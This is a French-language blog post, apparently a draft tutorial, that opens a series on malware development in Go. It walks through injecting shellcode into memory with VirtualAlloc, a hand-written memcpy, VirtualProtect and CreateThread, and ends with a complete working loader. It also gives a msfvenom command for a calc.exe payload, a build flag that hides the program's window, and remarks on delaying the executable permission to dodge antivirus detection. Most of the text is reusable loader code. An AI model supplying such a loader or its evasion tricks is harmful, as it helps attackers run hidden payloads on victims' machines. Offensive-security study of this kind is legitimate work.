+++
title = 'My First Post'
date = 2023-09-30T11:06:08+02:00
draft = true
+++

# Introduction

Le développement de malware est un vaste sujet qui peut être très complexe. Le but de ces articles va être de découvrir différentes techniques de malware et de sécurité offensive en les redéveloppant en Golang.  Dans le premier episode de cette série, on va commencer par les bases et apprendre à injecter un shellcode en mémoire.  

Mais commençons par les bases, un shellcode c'est quoi ?
## Shellcode

Un **shellcode** est une chaîne de caractères qui représente un code binaire exécutable. Un shellcode est PIC, Position-Independent Code ce qui veut dire qu'il peut être concu pour être executé peut importe ça possition en mémoire.

C'est un format très pratique quand il s'agit de développer des malware. Il existe de nombreuse manière de générer un shellcode et beaucoup de c2 propose ce format. Il est aussi possible de convertir un executable en shellcode en utilisants des tools comme [donut](https://github.com/TheWover/donut).
Pour faire notre malware, nous allons utiliser un shellcode qui va lancer le programme calc.exe sur windows. En principe, on représente un shellcode en hexadécimal (`-f hex` avec msfvenom) ou en binaire. 
Pour convertir un shellcode binaire en hexadecimal, on peut utiliser cette commande `hexdump -v -e '1/1 "%02x"' <bin_file>`. Dans notre code, il nous faudra ensuite le reconvertir en binaire.
Ce qui donne :

```go
// msfvenom -p windows/x64/exec CMD=calc.exe -f hex
shellcode,_ := hex.DecodeString("50515253565755...")
```

## Injection

Voici comment on va injecter notre shellcode :
1. Allouer de la mémoire
2. Copier notre shellcode
3. Rendre cette zone mémoire exécutable
4. Faire un thread pour executer notre shellcode

### VirtualAlloc
> [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

On va utiliser VirtualAlloc pour allouer une zone de mémoire pour pouvoir y copier notre shellcode. En Go, on peut utiliser le package Windows qui contient une fonction VirtualAlloc. [https://pkg.go.dev/golang.org/x/sys/windows#VirtualAlloc](https://pkg.go.dev/golang.org/x/sys/windows#VirtualAlloc) qui est en fait simplement un wrapper autour de l'appelle API. 

Ce qui va nous donner :

```go
package main  
  
import (  
	"encoding/hex"  
	"golang.org/x/sys/windows"  
	"log"  
)  
  
  
func main() {  
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883...")

	shellcodeExec, err := windows.VirtualAlloc(  
		uintptr(0), //[in, optional] LPVOID lpAddress,  
		uintptr(len(shellcode)), //[in] SIZE_T dwSize,  
		windows.MEM_COMMIT|windows.MEM_RESERVE, //[in] DWORD flAllocationType,  
		windows.PAGE_READWRITE, //[in] DWORD flProtect  
		)
		  
	if err != nil {  
		log.Fatal("Error while VirtualAlloc:", err)  
	}

	fmt.Printf("Address: %x", shellcodeExec)  
	fmt.Scanln()
}
```
Donc en premier argument, on passe l'adresse mémoire où on aimerais allouer notre mémoire. Comme ça nous est égal, et que l'argument est optionel, on lui passe 0. Ensuite la taille à allouer,  donc la taille de notre shellcode. Le prochain argument est le type d'allocation mémoire et finalement les droits sur cette zone mémoire. A terme, on va la rendre executable, mais pour des questions de détections d'antivirus, on va faire ça plus tard.

Pour voir un peu ce qui ce passe, j'ai ajouté un print de l'adresse mémoire ou on va allouer la mémoire ainsi qu'un `fmt.Scan.ln()` qui va nous permettre de stopper le programme pour voir ce qu'il se passe avec le debugger. 

On run le programme et l'adresse mémoire de la zone allouée va être affichée

```
Address: 1fcd76c0000
```
A l'aide de `x64dbg` on va pouvoir s'attacher au process, aller sans section mémoire et chercher cette adresse.
![](/img1.png)
On voit que notre zone mémoire est bien en Read Write et si on clique dessus, on voit qu'elle ne contiens encore rien.
![](/img2.png)

### Copier le shellcode
On pourrait utiliser  [RtlCopyMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory) pour faire ça, mais on va plutôt utiliser une méthode sans appel d'API. Cette fonction piqué d'un [exemple](https://github.com/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go) à Tim White est une implémentation de la fonction memcpy en golang. Elle prend en argument d'adresse de destination et le tableau de byte à y placer. 

```go
// memcpy in golang from https://github.com/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func memcpy(base uintptr, buf []byte) {  
	for i := 0; i < len(buf); i++ {  
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]  
	}  
}
```
Notre code ressemble maintenant à ça :
```go
package main  
  
import (  
	"encoding/hex"  
	"fmt"  
	"golang.org/x/sys/windows"  
	"log"  
	"unsafe"  
)  
  
var (  
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")  
	createThread = kernel32.NewProc("CreateThread")  
)  
  
func main() {  
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883...")  
	shellcodeExec, err := windows.VirtualAlloc(  
		uintptr(0), //[in, optional] LPVOID lpAddress,  
		uintptr(len(shellcode)), //[in] SIZE_T dwSize,  
		windows.MEM_COMMIT|windows.MEM_RESERVE, //[in] DWORD flAllocationType,  
		windows.PAGE_READWRITE, //[in] DWORD flProtect  
	)  
	if err != nil {  
		log.Fatal("Error while VirtualAlloc:", err)  
	}  
	fmt.Printf("Address: %x", shellcodeExec)  
	fmt.Scanln()  
  
	memcpy(shellcodeExec, shellcode)  
	fmt.Scanln()
}

// memcpy in golang from https://github.com/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func memcpy(base uintptr, buf []byte) {  
	for i := 0; i < len(buf); i++ {  
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]  
	}  
}
```
Comme avant, j'y ai ajouté un `fmt.Scan.ln()` pour servir de breakpoint. Si on le fait tourner et qu'on observer la zone de mémoire précédâmes alloué, on va y voir notre shellcode.
![](img4.png)
### VirtualProtect

> [https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)

On va maintenant changer les droits de la zone mémoire pour la rendre exécutable.

> [https://pkg.go.dev/golang.org/x/sys/windows#VirtualProtect](https://pkg.go.dev/golang.org/x/sys/windows#VirtualProtect)

```go
var oldProtect uint32  
err = windows.VirtualProtect(  
	shellcodeExec, //[in] LPVOID lpAddress,  
	uintptr(len(shellcode)), //[in] SIZE_T dwSize,  
	windows.PAGE_EXECUTE_READ, //[in] DWORD flNewProtect,  
	&oldProtect, //[out] PDWORD lpflOldProtect  
)  
if err != nil {  
	log.Fatal("Error while VirtualProtect:", err)  
}  
fmt.Scanln()
```
Cette fonction fonctionne un peu comme VirtualAlloc. On lui donne en paramètre l'adresse de notre shellcode, la taille, les nouveaux droit et oldProtect va contenir les ansiens droit. Après avoir modifié la zone mémoire, on voit que on est plus en Read Write, mais en Execute Read.
![](img4.png)
### CreateThread

> [https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)

On va finir par faire un nouveau Thread. Cette fonction n’existe pas dans le package Windows donc on va le faire à la main. 

```go
kernel32 = windows.NewLazySystemDLL("kernel32.dll")  
createThread := kernel32.NewProc("CreateThread")
hThread,_,_ := createThread.Call(
		0,                                 //lpThreadAttributes
		0,                                 //dwStackSize
		shellcodeExec,                     //lpStartAddress
		uintptr(0),                        //lpParameter
		0,                                 //dwCreationFlag
		0)                                 //lpThreadId
```
Ce qui est surtout important, c'est le `lpStartAddress` qui va contenir l'addresse de notre shellcode. Normalement, à ce stade on devrait avoir `calc.exe` qui s'est lancé.
## Result

```go
package main  
  
import (  
	"encoding/hex"  
	"golang.org/x/sys/windows"  
	"log"  
	"unsafe"  
)  
  
var (  
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")  
	createThread = kernel32.NewProc("CreateThread")  
)  
  
func main() {  
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883...")
  
	shellcodeExec, err := windows.VirtualAlloc(  
		uintptr(0), //[in, optional] LPVOID lpAddress,  
		uintptr(len(shellcode)), //[in] SIZE_T dwSize,  
		windows.MEM_COMMIT|windows.MEM_RESERVE, //[in] DWORD flAllocationType,  
		windows.PAGE_READWRITE, //[in] DWORD flProtect  
		)
		  
	if err != nil {  
		log.Fatal("Error while VirtualAlloc:", err)  
	}  
  
	memcpy(shellcodeExec, shellcode)  
  
	var oldProtect uint32  
	err = windows.VirtualProtect(  
		shellcodeExec, //[in] LPVOID lpAddress,  
		uintptr(len(shellcode)), //[in] SIZE_T dwSize,  
		windows.PAGE_EXECUTE_READ, //[in] DWORD flNewProtect,  
		&oldProtect, //[out] PDWORD lpflOldProtect  
	)
	  
	if err != nil {  
		log.Fatal("Error while VirtualProtect:", err)  
	}  
  
	_, _, err = createThread.Call(  
		0, //[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes,  
		0, //[in] SIZE_T dwStackSize,  
		shellcodeExec, //[in] LPTHREAD_START_ROUTINE lpStartAddress,  
		uintptr(0), //[in, optional] __drv_aliasesMem LPVOID lpParameter,  
		0, //[in] DWORD dwCreationFlags,  
		0, //[out, optional] LPDWORD lpThreadId  
		)  
  
	if err.Error() != "The operation completed successfully." {  
		log.Fatal("Error while CreateThread:", err)  
	}    
}  
  
// memcpy in golang from https://github.com/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func memcpy(base uintptr, buf []byte) {  
	for i := 0; i < len(buf); i++ {  
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]  
	}  
}
```

## Compilation

Si on veut éviter qu'il y aie une fenêtre lors de l'exection de notre programme, on peut utiliser le flag `windowsgui`.

```shell
go build -ldflags -H=windowsgui
```


# Conclusion

Dans ce premier petit article, on a vu comment injecter un shellcode en mémoire. Dans le prochain article, on va voir comment rendre notre malware un peu plus discret.

Tschuss !